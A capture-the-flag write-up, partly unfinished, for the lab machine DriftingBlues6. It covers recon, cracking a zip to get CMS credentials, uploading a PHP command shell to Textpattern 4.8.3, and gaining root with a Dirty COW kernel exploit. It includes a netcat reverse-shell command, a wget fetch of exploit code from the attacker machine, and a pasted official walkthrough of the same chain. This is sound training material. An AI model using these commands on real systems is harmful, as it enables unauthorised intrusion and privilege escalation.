---
title:
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/DriftingBlues6]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt 192.168.163.219       
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-03 19:04 +0900
Nmap scan report for 192.168.163.219
Host is up (0.089s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 62.96 seconds

```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/DriftingBlues6]
└─$ sudo nmap -Pn -p80 -sSCV -A -oN full_tcp-scan.txt --open 192.168.163.219
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-03 19:06 +0900
Nmap scan report for 192.168.163.219
Host is up (0.089s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: driftingblues
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern
|_http-server-header: Apache/2.2.22 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 - 3.13 (98%), Linux 2.6.32 - 3.10 (98%), Linux 3.10 - 4.11 (96%), Linux 3.2 - 4.14 (96%), Linux 3.2 (95%), Linux 3.2 - 3.10 (95%), Linux 3.2 - 3.16 (95%), Linux 3.2 - 3.8 (95%), Olivetti 65C-9 printer (95%), Linux 2.6.32 - 3.5 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   88.63 ms 192.168.45.1
2   88.55 ms 192.168.45.254
3   89.13 ms 192.168.251.1
4   89.48 ms 192.168.163.219

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.53 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/DriftingBlues6]
└─$ feroxbuster \
-u http://192.168.163.219 \
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.163.219/
 🚩  In-Scope Url          │ 192.168.163.219
 🚀  Threads               │ 25
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 💢  Status Code Filters   │ [403, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 💲  Extensions            │ [html, git, php, txt, bak, zip, old]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off
200      GET       76l       75w      750c http://192.168.163.219/index
200      GET       76l       75w      750c http://192.168.163.219/index.html
200      GET       76l       75w      750c http://192.168.163.219/
200      GET      212l     1206w    97264c http://192.168.163.219/db
200      GET        5l       14w      110c http://192.168.163.219/robots
200      GET        5l       14w      110c http://192.168.163.219/robots.txt
200      GET        2l        7w      227c http://192.168.163.219/spammer
200      GET        2l        7w      227c http://192.168.163.219/spammer.zip
[####################] - 2h   1661040/1661040 0s      found:8       errors:123    
[####################] - 2h   1661032/1661032 269/s   http://192.168.163.219/ 
```

# zip Crack
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/DriftingBlues6]
└─$ zip2john spammer.zip > spammer.zip.hash
ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 type=0
```
    
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/DriftingBlues6]
└─$ john spammer.zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
myspace4         (spammer.zip/creds.txt)     
1g 0:00:00:00 DONE 2/3 (2026-06-03 20:13) 33.33g/s 3403Kp/s 3403Kc/s 3403KC/s angeles!..gbby
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/DriftingBlues6]
└─$ unzip spammer.zip
Archive:  spammer.zip
[spammer.zip] creds.txt password: 
 extracting: creds.txt    
```           


```
┌──(kali㉿kali)-[~/CTF/OffSec/Play/DriftingBlues6]
└─$ ls
creds.txt  ferox.txt  full_tcp-scan.txt  open-port_scan.txt  spammer.zip  spammer.zip.hash
```
    
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/DriftingBlues6]
└─$ cat creds.txt                  
mayer:lionheart 
```

![](../../../assets/images/Pasted%20image%2020260604042515.png)

![](../../../assets/images/Pasted%20image%2020260604042450.png)

[Textpattern CMS (opens an external link in a new window)](https://textpattern.com/) (v4.8.3)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/DriftingBlues6]
└─$ searchsploit textpattern 4.8.3             
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Textpattern 4.8.3 - Remote code execution (Authenticated) (2)                     | php/webapps/49620.py
TextPattern CMS 4.8.3 - Remote Code Execution (Authenticated)                     | php/webapps/48943.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/DriftingBlues6]
└─$ searchsploit -m 49620         
  Exploit: Textpattern 4.8.3 - Remote code execution (Authenticated) (2)
      URL: https://www.exploit-db.com/exploits/49620
     Path: /usr/share/exploitdb/exploits/php/webapps/49620.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (379)
Copied to: /home/kali/CTF/OffSec/Play/DriftingBlues6/49620.py
```

http://192.168.203.219/textpattern/textpattern/index.php?event=file

![](../../../assets/images/Pasted%20image%2020260604052130.png)

http://192.168.203.219/textpattern/files/test.php?cmd=id

![](../../../assets/images/Pasted%20image%2020260604052417.png)

http://192.168.203.219/textpattern/files/test.php?cmd=nc%20192.168.45.178%204444%20-e%20/bin/bash

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/DriftingBlues6]
└─$ rlwrap -cAr nc -lvnp 4444             
listening on [any] 4444 ...
connect to [192.168.45.178] from (UNKNOWN) [192.168.203.219] 58393
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
hostname
driftingblues
```

```zsh

```

```zsh

```

```zsh

```

---

# Initial Access

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```bash
┌──(kali㉿kali)-[~/CTF/OffSec/Play/DriftingBlues6]
└─$ rlwrap -cAr nc -lvnp 4444             
listening on [any] 4444 ...
connect to [192.168.45.178] from (UNKNOWN) [192.168.203.219] 58393
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
hostname
driftingblues
python3 -c 'import pty; pty.spawn("/bin/bash")'

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@driftingblues:/var/www/textpattern/files$
```

```zsh
www-data@driftingblues:/var/www/textpattern/files$ uname -ar
uname -ar
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
```

```zsh
www-data@driftingblues:/var/www/textpattern/files$ wget http://192.168.45.178/40847.cpp
</www/textpattern/files$ wget http://192.168.45.178/40847.cpp                
--2026-06-03 15:35:05--  http://192.168.45.178/40847.cpp
Connecting to 192.168.45.178:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10212 (10.0K) [text/x-c++src]
Saving to: `40847.cpp'

100%[======================================>] 10,212      34.5K/s   in 0.3s    

2026-06-03 15:35:06 (34.5 KB/s) - `40847.cpp' saved [10212/10212]

www-data@driftingblues:/var/www/textpattern/files$ dir
dir
40847.cpp  test.php
www-data@driftingblues:/var/www/textpattern/files$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
<+ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil     
www-data@driftingblues:/var/www/textpattern/files$ ls -la
ls -la
total 76
drwxrwxrwx 2 root     root      4096 Jun  3 15:35 .
drwxr-xr-x 7 root     root      4096 Sep 13  2020 ..
-rw-r--r-- 1 root     root       258 Sep 13  2020 .htaccess
-rw-r--r-- 1 www-data www-data 10212 Jun  3 15:33 40847.cpp
-rwxr-xr-x 1 www-data www-data 48041 Jun  3 15:35 dirtycow2
-rw-r--r-- 1 www-data www-data    30 Jun  3 15:21 test.php
www-data@driftingblues:/var/www/textpattern/files$ ./dirycow2
./dirycow2
bash: ./dirycow2: No such file or directory
www-data@driftingblues:/var/www/textpattern/files$ ./dirtycow2
./dirtycow2
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
www-data@driftingblues:/var/www/textpattern/files$
```

```zsh
www-data@driftingblues:/var/www/textpattern/files$ su -
su -
Password: dirtyCowFun

root@driftingblues:~# cat /root/proof.txt
cat /root/proof.txt
1b07c1d9db449549ab93e82a35756455
root@driftingblues:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
    link/ether 00:50:56:ab:8c:ac brd ff:ff:ff:ff:ff:ff
    inet 192.168.203.219/24 brd 192.168.203.255 scope global eth0
    inet6 fe80::250:56ff:feab:8cac/64 scope link 
       valid_lft forever preferred_lft forever
root@driftingblues:~# 

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Walkthrough
Close
Exploitation Guide for Drifting Blues 6
Summary
In this guide, we will exploit an RCE in the textpattern 4.8.3 CMS before esclating privileges using a variant of the Dirty Cow Local Privilege Esclation to obtain root access.

Enumeration
We begin the enumeration process with an nmap scan.

┌──(kali㉿kali)-[~]
└─$ nmap 192.168.120.187      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 02:21 MST
Nmap scan report for 192.168.120.187
Host is up (0.100s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 31.61 seconds
We see port 80 is open and running on the target.

We open a web browser of our choice and navigate to the target IP where we see the following homepage.


home
home
During our nmap scan we saw an entry for robots.txt, we can use curl to view it's contents.
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.187/robots.txt
User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
Upon navigating to /textpattern/textpattern we are met with the following CMS login page.


cms
cms
Referring back to our hint, we are essentially directory bruteforcing the site specficially looking for .zip extensions.
We can use gobuster targeting .zip extension with -x.

┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.120.187:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.120.187:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/30 00:09:53 Starting gobuster in directory enumeration mode
===============================================================
/spammer
/spammer.zip
...
From the output we see an entry for spammer.zip.

We download the spammer.zip file to our machine and upon attempting to unzip the file we see it is password protected.

┌──(kali㉿kali)-[~]
└─$ unzip spammer.zip
Archive:  spammer.zip
[spammer.zip] creds.txt password:               
We begin by using the zip2john utility to output our hash.

┌──(kali㉿kali)-[~/Downloads]
└─$ zip2john spammer.zip > spammer.hashes
ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 type=0\
┌──(kali㉿kali)-[~]
└─$ cat spammer.hashes
spammer.zip/creds.txt:$pkzip$1*1*2*0*1b*f*b003611d*0*27*0*1b*b003*2d41804a5ea9a60b1769d045bfb94c71382b2e5febf63bda08a56c*$/pkzip$:creds.txt:spammer.zip::spammer.zip
Now we can use john to crack our spammer.hashes file.

┌──(kali㉿kali)-[~]
└─$ john --wordlist=rockyou.txt hash 

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
myspace4         (?)     
1g 0:00:05:53 DONE (2022-07-08 07:45) 0.002832g/s 47.20p/s 47.20c/s 47.20C/s natedog..myspace4
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
From the output we see the password myspace4.

Turning to our spammer.zip file, we enter the myspace4 passwords and see a creds.txt file.

┌──(kali㉿kali)-[~/db6]
└─$ unzip spammer.zip 
Archive:  spammer.zip
[spammer.zip] creds.txt password: 
 extracting: creds.txt               
                                                                                           
┌──(kali㉿kali)-[~/db6]
└─$ cat creds.txt
mayer:lionheart
The file reveals the credentials mayer:lionheart.

We can use these credentials to authenticate to the /textpattern/textpattern CMS page.

Upon authenticating we see the version v4.8.3 in the footer.


version
version
Navigating to the content section, we can upload files.

We begin by modifying the php-reverse-shell.php reverse shell which is installed in kali by default.

We modify the IP and PORT options on line 49 and 50 to our attacker IP and port.

┌──(kali㉿kali)-[~]
└─$ cat php-reverse-shell.php 
....
$ip = '192.168.118.13';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
.....
Next, we set up a listener on our attack machine.

┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 1234
listening on [any] 1234 ...
Now we upload our php-reverse-shell.php on the content section and trigger it by navigating to http://192.168.120.187/textpattern/files/php-reverse-shell.php.

Finally, we receive a reverse shell on our listener,

┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.120.187] 47052
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
 04:11:32 up 7 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1                      04:04    7:11   0.01s  0.01s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
.......
Privilege Escalation
During our enumeration we can use the uname -a command to display all system information such as the OS name, version, and Kernel release.

www-data@driftingblues:/home$ uname -a
uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
While researching the kernel version we see that our Debian 3.2.78-1 is vulnerable to a variant of the Dirty Cow Privilege Esclation.

We begin by mirroring the exploit to our machine.

┌──(kali㉿kali)-[~/db6]
└─$ searchsploit -m 40839
  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
File Type: C source, ASCII text

Copied to: /home/kali/db6/40839.c
We host a python webserver on our attack machine

┌──(kali㉿kali)-[~/db6]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
We navigate to the /tmp directory on our victim machine and transfer our exploit.

www-data@driftingblues:/tmp$ wget http://192.168.118.4/40839.c
Next, we compile our exploit using gcc.

www-data@driftingblues:/tmp$ gcc -pthread 40839.c -o 40839 -lcrypt
Now we run the exploit and input a password for the newly generated passwd.bak file which we will use to authenticate as the newly generated user.

www-data@driftingblues:/tmp$ su firefart
su firefart
Password: 

firefart@driftingblues:/tmp# whoami
whoami
root
We have obtained root access on the victim machine.
```

</details>